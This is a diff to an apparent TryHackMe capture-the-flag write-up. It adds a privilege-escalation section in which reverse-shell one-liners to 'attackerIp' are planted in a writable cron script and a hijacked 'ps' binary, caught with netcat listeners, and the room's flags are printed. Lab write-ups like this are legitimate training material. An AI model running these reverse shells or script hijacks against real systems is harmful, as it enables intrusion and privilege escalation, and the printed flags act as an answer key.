@@ -89,7 +89,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ---
 
 ```bash
-stty raw -echo;fg
+stty raw -echo; fg
 ```
 
 - `stty raw` -> passes keystrokes straight through (so Ctrl+C, arrows, etc. reach the target instead of your local machine)
@@ -100,7 +100,6 @@ stty raw -echo;fg
 ---
 
 - type `export TERM=xterm`, enter
-- hit `ctrl+c`
 - arrived back to the reverse shell
 - move up in the folder
 - list the content `ls -la`
@@ -114,4 +113,85 @@ stty raw -echo;fg
 THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
 ```
 
-## to be continued ...
+## monitor_user escalation
+
+- got to `/opt`
+- `/opt` is the standard Linux folder for optional / add-on software
+- anything in `/opt` was deliberately put there, it's a hotspot for PrivEsc (privilege escalation)
+- there is a `/app`, `/dev`, `/recon` folder, go to the `/dev`
+- in the dev there is a `backup.sh` file
+- check the `backup.sh` file `ls -la backup.sh`
+
+```bash
+-rwxrwxr-x 1 dev_user dev_user 60 Jun  9 09:03 backup.sh
+```
+
+```
+-      rwx      rwx      r-x
+type   owner    group    others
+```
+
+- whoever in the **dev_user** group can write the file
+- check the **recon_user** `id`
+
+```bash
+uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
+```
+
+- the **recon_user** is part of the **dev_user** group
+- edit the `backup.sh`
+- `nano backup.sh`
+
+```sh
+#!/bin/bash
+#tar -czf /tmp/recon_backup.tgz /home/recon_user
+bash -i >& /dev/tcp/attackerIp/4545 0>&1
+```
+
+> `bash` vs `sh` -> bash is more feature rich
+
+- probably the `backup.sh` been run by the **dev_user** as a **cronjob**
+- create a listener on the port `4545`
+
+```bash
+nc -lnvp 4545
+```
+
+- after a minute the reverse shell will let you in as **dev_user**
+- upgrade the terminal
+- check with `sudo -l` the if it needs password
+- check the `/opt/dev/bin` folder
+- there is a file called `ps`
+- probably the `monitor_user`'s `ps` got hijacked already (thm help)
+- `monitor_user` probably calls `ps` regularly
+- lets check it out
+
+```bash
+ls -la ps
+-rw-rw-r-- 1 dev_user dev_user 62 Apr 26 18:19 ps
+```
+
+- it can be modified by the **dev_user**
+
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/attackerIp/4646 0>&1
+```
+
+- make the `ps` executable
+
+```bash
+chmod +x ps
+```
+
+- start a listener on port `4646`
+- after a minute the reverse shell will let you in as **monitor_user**
+- upgrade the terminal
+- move to the user folder `cd ~`
+- `cat` the `flag.txt`
+
+> What is the flag found in the monitor_user’s home directory?
+
+```
+THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}
+```
